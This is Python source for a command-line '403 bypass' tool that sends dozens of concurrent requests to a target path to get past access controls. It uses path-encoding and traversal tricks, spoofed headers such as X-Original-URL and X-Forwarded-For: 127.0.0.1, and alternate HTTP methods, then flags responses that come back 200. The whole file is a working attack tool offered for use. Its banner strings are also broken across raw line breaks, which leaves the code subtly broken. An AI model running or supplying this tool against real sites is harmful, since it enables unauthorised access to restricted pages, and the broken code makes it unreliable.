#!/usr/bin/env python3

import sys
import asyncio
import aiohttp
import json
import argparse
from datetime import datetime
from urllib.parse import urlparse
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn
from rich.text import Text
from rich.live import Live
from rich.columns import Columns
from rich import box
from rich.style import Style
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

console = Console()

BANNER = """
[bold cyan]
██████╗ ██╗   ██╗██████╗  █████╗ ███████╗███████╗     ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗
██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝    ██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝
██████╔╝ ╚████╔╝ ██████╔╝███████║███████╗███████╗    ██║  ███╗███████║██║   ██║███████╗   ██║   
██╔══██╗  ╚██╔╝  ██╔═══╝ ██╔══██║╚════██║╚════██║    ██║   ██║██╔══██║██║   ██║╚════██║   ██║   
██████╔╝   ██║   ██║     ██║  ██║███████║███████║    ╚██████╔╝██║  ██║╚██████╔╝███████║   ██║   
╚═════╝    ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝     ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   
[/bold cyan][bold green]                              403 Bypass Tool — by alonebeast002[/bold green]
"""

# All bypass techniques
def get_techniques(url, path):
    base = url.rstrip("/")
    p = path.strip("/")

    path_techniques = [
        (f"{base}/{p}", "Original"),
        (f"{base}/%2e/{p}", "URL encode dot"),
        (f"{base}/{p}/.", "Trailing dot"),
        (f"{base}//{p}//", "Double slash"),
        (f"{base}/./{p}/./", "Dot slash"),
        (f"{base}/{p}%20", "Space encode"),
        (f"{base}/{p}%09", "Tab encode"),
        (f"{base}/{p}?", "Question mark"),
        (f"{base}/{p}.html", "HTML extension"),
        (f"{base}/{p}/?anything", "Fake param"),
        (f"{base}/{p}#", "Hash"),
        (f"{base}/{p}/*", "Wildcard"),
        (f"{base}/{p}.php", "PHP extension"),
        (f"{base}/{p}.json", "JSON extension"),
        (f"{base}/{p}..;/", "Path traversal"),
        (f"{base}/{p};/", "Semicolon"),
        (f"{base}/{p}/", "Trailing slash"),
        (f"{base}/{p}..%2F", "URL encoded traversal"),
        (f"{base}/;/{p}", "Leading semicolon"),
        (f"{base}/.;/{p}", "Dot semicolon"),
    ]

    header_techniques = [
        (f"{base}/{p}", {"X-Original-URL": f"/{p}"}, "X-Original-URL"),
        (f"{base}/{p}", {"X-Custom-IP-Authorization": "127.0.0.1"}, "X-Custom-IP-Auth"),
        (f"{base}/{p}", {"X-Forwarded-For": "127.0.0.1"}, "X-Forwarded-For"),
        (f"{base}/{p}", {"X-Forwarded-For": "127.0.0.1:80"}, "X-Forwarded-For:80"),
        (f"{base}", {"X-rewrite-url": f"/{p}"}, "X-Rewrite-URL"),
        (f"{base}/{p}", {"X-Host": "127.0.0.1"}, "X-Host"),
        (f"{base}/{p}", {"X-Forwarded-Host": "127.0.0.1"}, "X-Forwarded-Host"),
        (f"{base}/{p}", {"X-Real-IP": "127.0.0.1"}, "X-Real-IP"),
        (f"{base}/{p}", {"X-Client-IP": "127.0.0.1"}, "X-Client-IP"),
        (f"{base}/{p}", {"X-ProxyUser-Ip": "127.0.0.1"}, "X-ProxyUser-Ip"),
        (f"{base}/{p}", {"Client-IP": "127.0.0.1"}, "Client-IP"),
        (f"{base}/{p}", {"True-Client-IP": "127.0.0.1"}, "True-Client-IP"),
        (f"{base}/{p}", {"Cluster-Client-IP": "127.0.0.1"}, "Cluster-Client-IP"),
        (f"{base}/{p}", {"X-Originating-IP": "127.0.0.1"}, "X-Originating-IP"),
        (f"{base}/{p}", {"Forwarded": "for=127.0.0.1"}, "Forwarded"),
    ]

    method_techniques = [
        (f"{base}/{p}", "TRACE", "TRACE method"),
        (f"{base}/{p}", "POST", "POST + Content-Length:0"),
        (f"{base}/{p}", "PUT", "PUT method"),
        (f"{base}/{p}", "PATCH", "PATCH method"),
        (f"{base}/{p}", "OPTIONS", "OPTIONS method"),
        (f"{base}/{p}", "HEAD", "HEAD method"),
    ]

    return path_techniques, header_techniques, method_techniques


async def fetch(session, url, headers=None, method="GET", extra_headers=None):
    h = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Accept": "*/*",
    }
    if headers:
        h.update(headers)
    if extra_headers:
        h.update(extra_headers)
    if method == "POST":
        h["Content-Length"] = "0"
    try:
        async with session.request(
            method, url, headers=h, ssl=False,
            timeout=aiohttp.ClientTimeout(total=10),
            allow_redirects=True
        ) as resp:
            body = await resp.read()
            return resp.status, len(body), url
    except Exception as e:
        return None, 0, url


def status_color(code):
    if code is None:
        return "[dim]ERR[/dim]"
    if code == 200:
        return f"[bold green]{code}[/bold green]"
    if code in (301, 302, 307, 308):
        return f"[bold yellow]{code}[/bold yellow]"
    if code == 403:
        return f"[bold red]{code}[/bold red]"
    if code == 404:
        return f"[dim]{code}[/dim]"
    if code == 500:
        return f"[bold magenta]{code}[/bold magenta]"
    return f"[white]{code}[/white]"


async def check_wayback(session, url, path):
    try:
        api = f"https://archive.org/wayback/available?url={url}/{path}"
        async with session.get(api, timeout=aiohttp.ClientTimeout(total=10)) as resp:
            data = await resp.json()
            snap = data.get("archived_snapshots", {}).get("closest", {})
            if snap.get("available"):
                return snap.get("url"), snap.get("timestamp")
    except:
        pass
    return None, None


def save_results(results, url, path, output_file):
    data = {
        "target": url,
        "path": path,
        "scan_time": datetime.now().isoformat(),
        "results": results,
        "bypassed": [r for r in results if r.get("status") == 200]
    }
    with open(output_file, "w") as f:
        json.dump(data, f, indent=2)


async def run_scan(url, path, wordlist=None, concurrency=20, save=True, extra_headers=None):
    console.print(BANNER)

    coffee = (
        "
"
        "[bold cyan]        ( ([/bold cyan]
"
        "[bold cyan]         ) )    [/bold cyan]    [bold green]Grab a coffee and relax...[/bold green]
"
        "[bold cyan]      ........  [/bold cyan]    [bold cyan]Loading bypass techniques...[/bold cyan]
"
        "[bold cyan]      |      |] [/bold cyan]    [bold yellow]Async engine spinning up...[/bold yellow]
"
        "[bold cyan]      \\      /  [/bold cyan]    [bold magenta]Header injections armed...[/bold magenta]
"
        "[bold cyan]       `----'   [/bold cyan]    [bold green]Ghost is slipping through walls...[/bold green]
"
    )
    console.print(coffee)
    console.print("[bold green][+][/bold green] Bypass Ghost v0.0.1 [bold cyan]—[/bold cyan] scan engine active...
")

    paths_to_scan = [path]
    if wordlist:
        try:
            with open(wordlist) as f:
                paths_to_scan = [line.strip() for line in f if line.strip()]
            console.print(f"[cyan]Loaded [bold]{len(paths_to_scan)}[/bold] paths from wordlist[/cyan]\n")
        except FileNotFoundError:
            console.print(f"[red]Wordlist not found: {wordlist}[/red]")
            return

    console.print(Panel(
        f"[bold white]Target:[/bold white] [cyan]{url}[/cyan]\n"
        f"[bold white]Path:[/bold white]   [cyan]{path}[/cyan]\n"
        f"[bold white]Time:[/bold white]   [dim]{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}[/dim]",
        title="[bold yellow]SCAN CONFIG[/bold yellow]",
        border_style="yellow",
        box=box.ROUNDED
    ))

    all_results = []
    bypassed = []

    connector = aiohttp.TCPConnector(limit=concurrency, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:

        for current_path in paths_to_scan:
            path_techs, header_techs, method_techs = get_techniques(url, current_path)

            # Build all tasks
            tasks = []

            for u, label in path_techs:
                tasks.append(("path", label, u, None, "GET"))

            for u, hdrs, label in header_techs:
                tasks.append(("header", label, u, hdrs, "GET"))

            for u, method, label in method_techs:
                tasks.append(("method", label, u, None, method))

            table = Table(
                title=f"[bold cyan]Results for /{current_path}[/bold cyan]",
                box=box.SIMPLE_HEAD,
                show_lines=False,
                border_style="cyan",
                header_style="bold cyan"
            )
            table.add_column("Status", width=8, justify="center")
            table.add_column("Size", width=10, justify="right")
            table.add_column("Type", width=10, justify="center")
            table.add_column("Technique", justify="left")
            table.add_column("URL", justify="left", no_wrap=False)

            semaphore = asyncio.Semaphore(concurrency)

            async def bounded_fetch(task):
                async with semaphore:
                    t_type, label, u, hdrs, method = task
                    status, size, final_url = await fetch(session, u, hdrs, method, extra_headers)
                    return t_type, label, u, status, size

            with Progress(
                SpinnerColumn(style="cyan"),
                TextColumn("[cyan]Scanning..."),
                BarColumn(bar_width=30, style="cyan", complete_style="green"),
                TaskProgressColumn(),
                console=console,
                transient=True
            ) as progress:
                task_id = progress.add_task("", total=len(tasks))
                coros = [bounded_fetch(t) for t in tasks]
                for coro in asyncio.as_completed(coros):
                    t_type, label, u, status, size = await coro
                    progress.advance(task_id)

                    result = {
                        "type": t_type,
                        "technique": label,
                        "url": u,
                        "status": status,
                        "size": size
                    }
                    all_results.append(result)

                    if status == 200:
                        bypassed.append(result)

                    # Only show non-404, non-error in table
                    if status and status != 404:
                        type_color = {
                            "path": "blue",
                            "header": "magenta",
                            "method": "yellow"
                        }.get(t_type, "white")

                        table.add_row(
                            status_color(status),
                            f"[dim]{size}[/dim]",
                            f"[{type_color}]{t_type}[/{type_color}]",
                            f"[white]{label}[/white]",
                            f"[dim]{u[:80]}[/dim]"
                        )

            console.print(table)

            # Wayback check
            console.print("[dim]Checking Wayback Machine...[/dim]")
            wb_url, wb_time = await check_wayback(session, url, current_path)
            if wb_url:
                console.print(Panel(
                    f"[bold green]Archived snapshot found![/bold green]\n"
                    f"[white]URL:[/white] [cyan]{wb_url}[/cyan]\n"
                    f"[white]Timestamp:[/white] [yellow]{wb_time}[/yellow]",
                    title="[bold yellow]Wayback Machine[/bold yellow]",
                    border_style="yellow"
                ))
            else:
                console.print("[dim]No Wayback Machine snapshot found.[/dim]\n")

    # Summary
    console.print()
    if bypassed:
        console.print(Panel(
            "\n".join([
                f"[bold green]{r['status']}[/bold green]  [{r['type']}] [cyan]{r['technique']}[/cyan]\n   [dim]{r['url']}[/dim]"
                for r in bypassed
            ]),
            title=f"[bold green]BYPASSED! {len(bypassed)} technique(s) worked[/bold green]",
            border_style="green",
            box=box.DOUBLE
        ))
    else:
        console.print(Panel(
            "[bold red]No bypass found with current techniques.[/bold red]",
            border_style="red"
        ))

    if save:
        out = f"bypass_results_{urlparse(url).netloc.replace('.','_')}_{path.replace('/','_')}.json"
        save_results(all_results, url, path, out)
        console.print(f"\n[dim]Results saved to [bold]{out}[/bold][/dim]")


def main():
    parser = argparse.ArgumentParser(
        description="Bypass-403 — 10x Powerful 403 Bypass Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  bypass403 https://example.com admin
  bypass403 https://example.com admin -w paths.txt
  bypass403 https://example.com admin --no-save
  bypass403 https://example.com admin -H "Cookie: session=abc"
        """
    )
    parser.add_argument("url", help="Target URL (e.g. https://example.com)")
    parser.add_argument("path", help="Path to bypass (e.g. admin)")
    parser.add_argument("-w", "--wordlist", help="Wordlist file of paths to test", default=None)
    parser.add_argument("-c", "--concurrency", help="Concurrent requests (default: 20)", type=int, default=20)
    parser.add_argument("--no-save", help="Do not save results to file", action="store_true")
    parser.add_argument("-H", "--header", help='Extra header (e.g. "Cookie: session=abc")', action="append")

    args = parser.parse_args()

    extra_headers = {}
    if args.header:
        for h in args.header:
            if ":" in h:
                k, v = h.split(":", 1)
                extra_headers[k.strip()] = v.strip()

    asyncio.run(run_scan(
        args.url,
        args.path,
        wordlist=args.wordlist,
        concurrency=args.concurrency,
        save=not args.no_save,
        extra_headers=extra_headers
    ))


if __name__ == "__main__":
    main()
